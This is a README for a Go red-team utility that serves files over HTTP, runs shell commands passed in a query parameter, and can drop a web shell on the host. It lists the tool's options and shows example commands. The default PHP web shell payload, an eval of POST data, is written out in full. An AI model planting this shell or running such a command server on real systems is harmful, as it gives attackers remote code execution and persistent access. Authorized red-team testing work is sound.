# HTTP Server GO

This is a small tool written in Go that can quickly start HTTP file browsing services in the Red Team intranet environment, and can execute shell commands. It supports the following features:

- Serving files from a specified directory
- Ability to execute shell commands with a specified query parameter
- Customizable shell path and query parameter
- Customizable IP address and port
- Supports PHP, Java, and .NET shells (currently only supports dumping PHP shells)
- Option to run the server in the background without printing anything to the console
- Option to dump the shell and execute it on the server (currently only supports dumping PHP shells)

## Usage

```
httpserver [OPTIONS]
```

### Application Options

- `-h`, `--help`: Show help message and exit
- `-p PORT`, `--port PORT`: Customize the port to listen on (default: 8080)
- `-d DIR`, `--dir DIR`: Customize the directory to serve files from (default: current directory)
- `-s SHELL`, `--shell SHELL`: Customize the shell path (default: `/?shell=`)
- `-cs CODE`, `--code-shell CODE`: Customize the query parameter for executing shell commands (default: `/?code=`)
- `-m MOD`, `--mod MOD`: Customize the shell mode (php/java/.net) (currently only supports dumping PHP shells)
- `--payload PAYLOAD`: Customize the shell content (default for PHP: `<?php eval($_POST['a']);`, default for Java: empty string)
- `--silent`: Run the server in the background without printing anything to the console
- `-dump`, `--dumpshell`: Dump the shell and execute it on the server (currently only supports dumping PHP shells)

### Help Options

- `-h`, `--help`: Show help message and exit

## Example Usage

To start the server with default settings:

```
httpserver
```

To start the server on port 8888:

```
httpserver -p 8888
```

To start the server and serve files from the `public` directory:

```
httpserver -d public
```

To start the server and use the query parameter `/?cmd=` to execute shell commands:

```
httpserver -cs cmd
```

To start the server and use the PHP shell with custom code:

```
httpserver -m php --payload '<?php echo "Hello, world!"; ?>' 
```

To dump the PHP shell and execute it on the server:

```
httpserver -dump -m php -cs cmd
```

##  Disclaimers 

 When using this tool for testing, you should ensure that the behavior complies with local laws and regulations and has obtained sufficient authorization**Do not scan unauthorized targets** 

 If you engage in any illegal behavior during the use of this tool, you shall bear the corresponding consequences on your own, and we will not assume any legal or joint liability. 

 Before installing and using this tool, please **carefully read and fully understand the content of each clause **. Restrictions, disclaimers, or other clauses that involve your significant rights and interests may be highlighted in bold, underlined, or other forms. Unless you have fully read, understood, and accepted all the terms of this agreement, please do not install and use this tool. Your use or any other express or implied acceptance of this agreement by you shall be deemed to have read and agreed to be bound by this agreement. 